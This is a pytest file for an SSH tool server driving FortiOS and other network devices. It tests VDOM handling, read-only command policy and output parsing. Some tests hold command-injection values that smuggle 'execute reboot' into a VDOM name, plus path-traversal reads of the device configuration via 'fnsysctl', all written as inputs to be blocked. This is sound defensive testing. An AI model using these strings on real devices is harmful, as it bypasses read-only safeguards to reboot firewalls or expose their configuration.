    proc = PagedFakeProcess(["sw1# show\r\nline1\r\n--More--"])
    conn = ShellConnection(FakeConn(), proc, command_timeout=2.0, quiet=0.05)
    await conn.send_command("show")
    assert " " not in proc.stdin.writes


async def test_shell_drain_banner_accepts_fortios_post_login_banner():
    """FortiOS `set post-login-banner enable` prints "(Press 'a' to accept):",
    which a bare newline does not dismiss. Also the regression guard that we
    send NO paging command to FortiOS — its only pager-off is a config write."""
    from ssh_mcp.shell import SHELL_PROFILES, ShellConnection

    proc = FakeProcess(["Authorized use only\r\n(Press 'a' to accept):", "\r\nfgt1-p # "])
    conn = ShellConnection(
        FakeConn(), proc, command_timeout=2.0, quiet=0.05, profile=SHELL_PROFILES["fortios"]
    )
    await conn.drain_banner()
    assert proc.stdin.writes == ["\n", "a"]


# --- FortiOS: VDOM context ------------------------------------------------


class ScriptedFakeStdout:
    """Fake PTY stdout that answers one scripted response per command written,
    the way a real CLI does. (FakeStdout streams every chunk immediately, which
    lets a single drain swallow several commands' worth of output.)"""

    def __init__(self, responses, stdin):
        self._responses = list(responses)
        self._stdin = stdin
        self._served = 0

    async def read(self, _n):
        # Wait until another command has been sent, then answer just that one.
        while len(self._stdin.writes) <= self._served:
            await asyncio.sleep(0.01)
        self._served += 1
        if self._responses:
            return self._responses.pop(0)
        return "fgt1-p # "

    def at_eof(self):
        return False


class ScriptedFakeProcess:
    def __init__(self, responses):
        self.stdin = FakeStdin()
        self.stdout = ScriptedFakeStdout(responses, self.stdin)


def _fortios_shell(responses):
    from ssh_mcp.shell import SHELL_PROFILES, ShellConnection

    proc = ScriptedFakeProcess(responses)
    conn = ShellConnection(
        FakeConn(), proc, command_timeout=2.0, quiet=0.05, profile=SHELL_PROFILES["fortios"]
    )
    return conn, proc


_VDOM_LIST_REPLY = (
    "config vdom\r\nedit root\r\n--\r\nedit prod\r\n"
    "--\r\nedit test1\r\n--\r\nedit test2\r\nfgt1-p # "
)


async def test_shell_enter_context_global():
    conn, proc = _fortios_shell(["fgt1-p # ", "fgt1-p # ", "fgt1-p (global) # "])
    assert await conn.enter_context("global") == "global"
    # to_top() first, so a half-open block never bleeds into the new context.
    assert proc.stdin.writes == ["abort\n", "end\n", "config global\n"]


async def test_shell_enter_context_vdom_validates_against_device():
    conn, proc = _fortios_shell(
        [
            "fgt1-p # ",  # abort
            "fgt1-p # ",  # end
            _VDOM_LIST_REPLY,  # show | grep "config vdom" -f -A1
            "fgt1-p (vdom) # ",  # config vdom
            "fgt1-p (prod) # ",  # edit prod
        ]
    )
    assert await conn.enter_context("prod") == "prod"
    assert "config vdom\n" in proc.stdin.writes
    assert "edit prod\n" in proc.stdin.writes


async def test_shell_enter_context_unknown_vdom_never_creates_it():
    """`config vdom` + `edit <unknown>` CREATES a VDOM, so the name is resolved
    against the device's real list BEFORE any `config vdom` is sent."""
    conn, proc = _fortios_shell(["fgt1-p # ", "fgt1-p # ", _VDOM_LIST_REPLY])
    with pytest.raises(ToolError) as exc:
        await conn.enter_context("nosuchvdom")
    assert "prod" in str(exc.value) and "test1" in str(exc.value)
    assert "config vdom\n" not in proc.stdin.writes


async def test_shell_enter_context_rejects_injection():
    """The `vdom` value is written to the channel as `edit <name>`, so a
    separator in it would smuggle a command past check_read_only entirely."""
    for bad in (
        "root\nexecute reboot",
        "root; execute reboot",
        "root global",
        "root|grep",
        "root`reboot`",
        "root$(reboot)",
        "",
        "a" * 32,
        "../x",
    ):
        conn, proc = _fortios_shell(["fgt1-p # "])
        with pytest.raises(ToolError):
            await conn.enter_context(bad)
        assert proc.stdin.writes == [], f"wrote to the channel for {bad!r}"


async def test_shell_enter_context_rejects_single_vdom_device():
    conn, _ = _fortios_shell(["fgt1-p # ", "fgt1-p # ", "fgt1-p # "])
    with pytest.raises(ToolError, match="not running in multi-VDOM mode"):
        await conn.enter_context("root")


async def test_run_command_rejects_vdom_on_non_fortios_platform():
    mcp = build_server(make_settings())
    with patch("ssh_mcp.tools.read.open_connection", fake_open_connection(FakeDriver())):
        async with Client(mcp) as client:
            with pytest.raises(ToolError, match="only supported on FortiOS"):
                await client.call_tool(
                    "ssh_run_command",
                    {
                        "host": "sw1",
                        "platform": "cisco-ios",
                        "command": "show version",
                        "vdom": "prod",
                    },
                )


async def test_run_commands_enters_context_once_for_the_batch():
    captured: dict = {}

    class ContextDriver(FakeDriver):
        async def enter_context(self, ctx):
            captured.setdefault("calls", []).append(ctx)
            return ctx

    driver = ContextDriver()

    def capturing_open(*args, **kwargs):
        captured["context"] = kwargs.get("context")
        return fake_open_connection(driver)(*args, **kwargs)

    mcp = build_server(make_settings())
    with patch("ssh_mcp.tools.read.open_connection", capturing_open):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_run_commands",
                {
                    "host": "fw1",
                    "platform": "fortios",
                    "commands": ["get system status", "get system interface", "show"],
                    "vdom": "prod",
                },
            )
    assert captured["context"] == "prod"
    assert result.structured_content["vdom"] == "prod"


# --- `vdom`: a placeholder value means "not supplied" ---------------------
#
# A client that transforms the advertised schema — stripping the `anyOf` and
# marking every defaulted parameter required — leaves the caller unable to omit
# an optional parameter. Every VDOM name a caller can type is truthy, so
# without a placeholder the read tools become uncallable on every platform that
# has no device contexts: the client demands `vdom` and the server rejects
# every value it can send. These tests pin the escape hatch.


def test_normalize_context_treats_placeholders_as_not_supplied():
    from ssh_mcp.safety import normalize_context

    for blank in (None, "", "   ", "\t", "null", "NULL", "none", "None", "  none  "):
        assert normalize_context(blank) is None, f"{blank!r} should mean 'not supplied'"
    # A real name survives, stripped; a name that merely CONTAINS a placeholder
    # is untouched.
    assert normalize_context("prod") == "prod"
    assert normalize_context("  prod  ") == "prod"
    assert normalize_context("global") == "global"
    assert normalize_context("nonemgmt") == "nonemgmt"


def test_check_vdom_supported_returns_normalized_value():
    """The helper is the tool boundary: it must hand back the normalized value,
    because callers pass the result to open_connection AND echo it back."""
    from ssh_mcp.tools._shared import check_vdom_supported

    assert check_vdom_supported("cisco-iosxe", "") is None
    assert check_vdom_supported("cisco-iosxe", "  ") is None
    assert check_vdom_supported("cisco-iosxe", "null") is None
    assert check_vdom_supported("fortios", "  prod  ") == "prod"
    # The deny-before-connect check itself is unchanged for a real name.
    with pytest.raises(ToolError, match="only supported on FortiOS"):
        check_vdom_supported("cisco-iosxe", "root")


@pytest.mark.parametrize("blank", ["", "   ", "null", "none"])
async def test_run_command_accepts_placeholder_vdom_on_non_fortios(blank):
    """The deadlock case: a client that cannot omit `vdom` must still be able
    to run a command on a platform that has no device contexts."""
    captured: dict = {}

    def capturing_open(*args, **kwargs):
        captured["context"] = kwargs.get("context")
        return fake_open_connection(FakeDriver(command_result="*11:44:02.123 EDT"))(*args, **kwargs)

    mcp = build_server(make_settings())
    with patch("ssh_mcp.tools.read.open_connection", capturing_open):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_run_command",
                {
                    "host": "sw1",
                    "platform": "cisco-iosxe",
                    "command": "show clock",
                    "vdom": blank,
                },
            )
    assert result.structured_content["failed"] is False
    assert "11:44:02" in result.structured_content["output"]
    # No context requested, so none is entered and none is claimed back.
    assert captured["context"] is None
    assert result.structured_content["vdom"] is None


@pytest.mark.parametrize("blank", ["", "   ", "null", "none"])
async def test_run_commands_accepts_placeholder_vdom_on_non_fortios(blank):
    captured: dict = {}

    def capturing_open(*args, **kwargs):
        captured["context"] = kwargs.get("context")
        return fake_open_connection(FakeDriver())(*args, **kwargs)

    mcp = build_server(make_settings())
    with patch("ssh_mcp.tools.read.open_connection", capturing_open):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_run_commands",
                {
                    "host": "sw1",
                    "platform": "aruba-cx",
                    "commands": ["show version", "show clock"],
                    "vdom": blank,
                },
            )
    assert result.structured_content["failed"] is False
    assert captured["context"] is None
    assert result.structured_content["vdom"] is None
    assert all(r["vdom"] is None for r in result.structured_content["results"])


async def test_send_config_accepts_placeholder_vdom_on_non_fortios():
    captured: dict = {}

    def capturing_open(*args, **kwargs):
        captured["context"] = kwargs.get("context")
        return fake_open_connection(FakeDriver())(*args, **kwargs)

    mcp = build_server(make_settings(write_enabled=True))
    with patch("ssh_mcp.tools.write.open_connection", capturing_open):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_send_config",
                {
                    "host": "sw1",
                    "platform": "cisco-iosxe",
                    "config_commands": ["interface Gi1/0/1", "description uplink"],
                    "confirm": "yes",
                    "vdom": "",
                },
            )
    assert result.structured_content["failed"] is False
    assert captured["context"] is None
    assert result.structured_content["vdom"] is None


@pytest.mark.parametrize("real", ["root", "prod", "global"])
async def test_run_command_still_rejects_a_real_vdom_on_non_fortios(real):
    """The deny-before-connect check must NOT be weakened: a named context on a
    platform with no contexts is still a hard error."""
    mcp = build_server(make_settings())
    with patch("ssh_mcp.tools.read.open_connection", fake_open_connection(FakeDriver())):
        async with Client(mcp) as client:
            for tool, extra in (
                ("ssh_run_command", {"command": "show version"}),
                ("ssh_run_commands", {"commands": ["show version"]}),
            ):
                with pytest.raises(ToolError, match="only supported on FortiOS"):
                    await client.call_tool(
                        tool,
                        {"host": "sw1", "platform": "cisco-iosxe", "vdom": real, **extra},
                    )


async def test_run_command_on_fortios_still_navigates_a_real_vdom():
    """FortiOS VDOM navigation is unchanged: a real name is passed through to
    the connection, entered, and echoed back."""
    captured: dict = {}

    class ContextDriver(FakeDriver):
        async def enter_context(self, ctx):
            captured.setdefault("entered", []).append(ctx)
            return ctx

    def capturing_open(*args, **kwargs):
        captured["context"] = kwargs.get("context")
        return fake_open_connection(ContextDriver(command_result="vdom output"))(*args, **kwargs)

    mcp = build_server(make_settings())
    with patch("ssh_mcp.tools.read.open_connection", capturing_open):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_run_command",
                {
                    "host": "fw1",
                    "platform": "fortios",
                    "command": "get system interface",
                    # Surrounding whitespace is stripped, not treated as blank.
                    "vdom": "  prod  ",
                },
            )
    assert captured["context"] == "prod"
    assert result.structured_content["vdom"] == "prod"
    assert result.structured_content["failed"] is False


async def test_enter_context_noop_for_placeholder_on_a_driver_without_contexts():
    """connection.enter_context is the single gate in front of every driver's
    navigation. A placeholder must be a no-op there — NOT the 'only supported
    on FortiOS' error, which is what made the deadlock inescapable."""
    from ssh_mcp.connection import enter_context

    class NoContextDriver:
        pass

    for blank in (None, "", "   ", "null", "none"):
        assert await enter_context(NoContextDriver(), blank) is None
    # A real name on a driver with no context support is still an error.
    with pytest.raises(ToolError, match="only supported on FortiOS"):
        await enter_context(NoContextDriver(), "root")


async def test_shell_enter_context_rejects_placeholders_without_touching_device():
    """A placeholder reaching the shell layer is a caller bug, so it must fail
    before any device round-trip — `config vdom` + `edit <name>` CREATES a VDOM
    and must never be reachable with a blank name."""
    for blank in ("", "   ", "null", "none"):
        conn, proc = _fortios_shell(["fgt1-p # "])
        with pytest.raises(ToolError, match="Invalid vdom"):
            await conn.enter_context(blank)
        assert proc.stdin.writes == [], f"wrote to the channel for {blank!r}"


# --- FortiOS: the narrow fnsysctl /proc carve-out -------------------------


def test_fortios_allows_fnsysctl_proc_reads():
    """`fnsysctl` is a busybox shell escape and is denied in general, but some
    counters have no CLI equivalent at all — the IPv6 RA/RS counters in
    /proc/net/snmp6 are reachable no other way."""
    for cmd in (
        "fnsysctl cat /proc/net/snmp6",
        "fnsysctl cat /proc/net/dev",
        "fnsysctl cat /proc/net/if_inet6",
        "fnsysctl cat /proc/meminfo",
        "fnsysctl ls /proc",
        "fnsysctl ls /proc/",
        "fnsysctl ls /proc/net",
        "fnsysctl cat /proc/net/snmp6 | grep Router",
    ):
        assert check_read_only(cmd, policy="fortios") is None, f"should allow: {cmd}"


def test_fortios_fnsysctl_carve_out_cannot_escape_proc():
    """The carve-out is the only busybox surface exposed, so it must not be
    escapable. `..` is an ordinary member of a path charset — without an
    explicit guard, `/proc/../data/config` reads the whole configuration."""
    for cmd in (
        "fnsysctl cat /proc/../data/config",
        "fnsysctl cat /proc/../../data/config",
        "fnsysctl cat /proc/./../data/config",
        "fnsysctl ls /proc/..",
        "fnsysctl cat /data/config",
        "fnsysctl ls /",
        "fnsysctl rm /proc/x",
        "fnsysctl tail /proc/net/dev",
        "fnsysctl cat /proc/net/snmp6 /data/config",
        "fnsysctl cat /proc/net/snmp6 ; execute reboot",
        "fnsysctl cat /proc/net/snmp6 > /tmp/x",
        "fnsysctl",
        "fnsysctl cat",
    ):
        assert check_read_only(cmd, policy="fortios") is not None, f"should block: {cmd}"


def test_fnsysctl_escape_is_denied_on_every_platform():
    """Mislabelling a FortiGate as another platform must not hand back an
    unrestricted shell — the FortiOS policy would not be applied at all, so the
    dangerous forms are denied globally. Only the safe /proc read survives."""
    assert check_read_only("fnsysctl cat /data/config") is not None
    assert check_read_only("fnsysctl ls /") is not None
    assert check_read_only("fnsysctl cat /proc/../data/config") is not None
    # The safe form stays allowed even without the policy — it is a plain read.
    assert check_read_only("fnsysctl cat /proc/net/snmp6") is None


# --- empty-output diagnostics --------------------------------------------


async def test_shell_notes_full_screen_command_with_no_printable_output():
    """A read that returns nothing is otherwise indistinguishable from a
    command that legitimately prints nothing. `diagnose sys top` renders with
    terminal control sequences and never returns to a prompt."""
    from ssh_mcp.shell import SHELL_PROFILES, ShellConnection

    esc = "\x1b[2J\x1b[H\x1b[1;1H\x1b[0m"
    proc = FakeProcess([f"fgt1-p # diagnose sys top\r\n{esc}"])
    conn = ShellConnection(
        FakeConn(), proc, command_timeout=2.0, quiet=0.05, profile=SHELL_PROFILES["fortios"]
    )
    resp = await conn.send_command("diagnose sys top")
    assert resp.result == ""
    assert resp.note is not None
    assert "control sequences" in resp.note


async def test_shell_notes_completely_silent_command():
    from ssh_mcp.shell import SHELL_PROFILES, ShellConnection

    proc = FakeProcess([""], eof_after=False)
    conn = ShellConnection(
        FakeConn(), proc, command_timeout=1.0, quiet=0.05, profile=SHELL_PROFILES["fortios"]
    )
    resp = await conn.send_command("diagnose sys pstack 1")
    assert resp.result == ""
    assert resp.note is not None and "no output at all" in resp.note


async def test_shell_no_note_when_output_is_present():
    from ssh_mcp.shell import SHELL_PROFILES, ShellConnection

    proc = FakeProcess(["fgt1-p # get system status\r\nVersion: v7.4.9\r\nfgt1-p # "])
    conn = ShellConnection(
        FakeConn(), proc, command_timeout=2.0, quiet=0.05, profile=SHELL_PROFILES["fortios"]
    )
    resp = await conn.send_command("get system status")
    assert resp.result == "Version: v7.4.9"
    assert resp.note is None


def test_fortios_quiet_window_exceeds_default():
    """The quiet window is only reached when the device never returns a prompt
    (prompt_tail ends every normal read), so FortiOS can afford a generous one
    — at 1.5s a slow-starting command returned empty."""
    from ssh_mcp.shell import SHELL_PROFILES, ShellProfile

    assert SHELL_PROFILES["fortios"].quiet > ShellProfile().quiet
    # ArubaOS platforms keep the original window.
    assert SHELL_PROFILES["aruba-os"].quiet == ShellProfile().quiet


# --- FortiOS: continuously-refreshing commands ----------------------------


class BurstyFakeStdout:
    """Emits chunks with a real pause between them — a periodic refresher such
    as `diagnose sys top`, which never returns to a prompt."""

    def __init__(self, chunks, gap):
        self._chunks = list(chunks)
        self._gap = gap
        self._first = True

    async def read(self, _n):
        if not self._first:
            await asyncio.sleep(self._gap)
        self._first = False
        if self._chunks:
            return self._chunks.pop(0)
        await asyncio.sleep(3600)
        return ""

    def at_eof(self):
        return False


class BurstyFakeProcess:
    def __init__(self, chunks, gap):
        self.stdin = FakeStdin()
        self.stdout = BurstyFakeStdout(chunks, gap)


async def test_shell_stops_a_continuous_refresher(monkeypatch):
    """`diagnose sys top` emits a frame forever and never returns a prompt, so
    the read used to run to command_timeout and the caller's request timed out.
    It is stopped once the bound passes, and the captured frames are returned."""
    from dataclasses import replace

    import ssh_mcp.shell as shell_mod
    from ssh_mcp.shell import SHELL_PROFILES, ShellConnection

    monkeypatch.setattr(shell_mod, "_STREAM_GAP", 0.05)
    profile = replace(SHELL_PROFILES["fortios"], stream_bound=0.25, quiet=5.0)
    proc = BurstyFakeProcess(
        ["fgt1-p # diagnose sys top\r\n", "frame1\r\n", "frame2\r\n", "frame3\r\n"], gap=0.1
    )
    conn = ShellConnection(FakeConn(), proc, command_timeout=30.0, profile=profile)
    resp = await conn.send_command("diagnose sys top")

    assert resp.elapsed_time < 5.0, "should stop at the bound, not the timeout"
    assert "frame1" in resp.result
    assert "q" in proc.stdin.writes, "must stop the refresher on the device"
    assert resp.note is not None and "refreshes continuously" in resp.note


async def test_shell_does_not_cut_a_large_continuous_dump(monkeypatch):
    """The discriminator that matters: a 648KB `show` streams with no idle gaps
    and ends on a prompt. It must run to completion however long it takes."""
    from dataclasses import replace

    import ssh_mcp.shell as shell_mod
    from ssh_mcp.shell import SHELL_PROFILES, ShellConnection

    monkeypatch.setattr(shell_mod, "_STREAM_GAP", 0.05)
    profile = replace(SHELL_PROFILES["fortios"], stream_bound=0.05, quiet=5.0)
    chunks = ["fgt1-p # show\r\n"] + [f"line{i}\r\n" for i in range(40)] + ["fgt1-p # "]
    proc = BurstyFakeProcess(chunks, gap=0.0)  # continuous: no idle gaps
    conn = ShellConnection(FakeConn(), proc, command_timeout=30.0, profile=profile)
    resp = await conn.send_command("show")

    assert "q" not in proc.stdin.writes, "a continuous dump must never be stopped"
    assert "line0" in resp.result and "line39" in resp.result
    assert resp.note is None


def test_only_fortios_bounds_refreshers():
    from ssh_mcp.shell import SHELL_PROFILES, ShellProfile

    assert ShellProfile().stream_bound is None
    assert SHELL_PROFILES["aruba-os"].stream_bound is None
    assert SHELL_PROFILES["fortios"].stream_bound == 6.0
